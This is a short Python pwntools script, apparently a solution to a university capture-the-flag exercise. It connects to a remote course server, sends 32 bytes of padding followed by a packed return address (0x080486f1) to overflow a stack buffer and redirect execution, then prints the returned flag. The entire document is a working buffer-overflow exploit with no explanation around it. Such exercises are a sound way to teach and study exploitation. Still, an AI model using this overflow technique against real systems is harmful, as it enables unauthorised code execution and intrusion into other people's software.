from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25153

s = remote(SERVER, PORT, timeout=9999)

s.recv(512)
s.sendline(b'1'*32 + p32(0x080486f1))
time.sleep(1)
flag = s.recv(512).decode()
print(flag)
